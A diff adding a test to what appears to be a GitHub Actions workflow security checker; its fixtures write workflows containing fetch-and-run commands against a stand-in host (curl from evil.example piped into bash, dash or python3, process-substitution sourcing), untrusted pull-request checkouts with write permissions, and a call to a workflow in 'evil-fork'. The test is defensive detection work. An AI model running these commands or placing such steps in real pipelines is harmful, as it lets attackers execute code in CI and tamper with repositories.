@@ -148,3 +148,43 @@ def test_bypass_fixtures_r3_git_fetch_fork_sarif_wget_bashc(tmp_path):
     findings = cwp.check(tmp_path)
     caught = {f.split(":")[0] for f in findings}
     assert {"e.yml", "f.yml", "g.yml"} <= caught, findings
+
+
+def test_bypass_fixtures_r5_witness_family(tmp_path):
+    """Round-5 verifier executed witnesses: each flagged shape must trip the
+    code-execution gate (fixture h = single var: only the exec shape varies;
+    i = foreign fork caller with a job-level map overriding inherited writes,
+    isolating the workflow-level SARIF exemption)."""
+    shapes = [
+        'git -C src fetch origin refs/pull/7/head && git -C src checkout FETCH_HEAD && make test',
+        'git -c protocol.version=2 clone https://github.com/example/repo.git',
+        'bash -lc "$(curl -fsSL https://evil.example/x.sh)"',
+        'curl https://evil.example/x.sh | env bash',
+        'curl https://evil.example/x.sh | dash',
+        'bash <(curl https://evil.example/x.sh)',
+        'source <(curl https://evil.example/x.sh)',
+        'curl -o x.sh https://evil.example/x.sh && sh x.sh',
+        'curl https://evil.example/x.py | python3',
+        'git pull origin refs/pull/7/head',
+        'npx -y pkg@latest run-tests',
+        'pip install git+https://github.com/example/repo.git',
+    ]
+    lines = []
+    for i, s in enumerate(shapes):
+        lines.append(
+            f"  step{i}:\n    runs-on: ubuntu-latest\n    steps:\n      - run: {s}\n"
+        )
+    (tmp_path / "h.yml").write_text(
+        "on: [pull_request]\npermissions:\n  contents: write\njobs:\n" + "\n".join(lines)
+    )
+    (tmp_path / "i.yml").write_text(
+        "on: [pull_request]\n"
+        "permissions:\n  contents: read\n  security-events: write\n"
+        "jobs:\n  j:\n    uses: evil-fork/repo/.github/workflows/osv-scanner.yml@main\n"
+        "    permissions:\n      contents: read\n      security-events: write\n"
+    )
+    findings = cwp.check(tmp_path)
+    caught = {f.split(":")[0] for f in findings}
+    assert {"h.yml", "i.yml"} <= caught, findings
+    # h.yml must be caught via the code-execution gate, not the missing-map rule
+    assert any("h.yml" in f for f in findings)
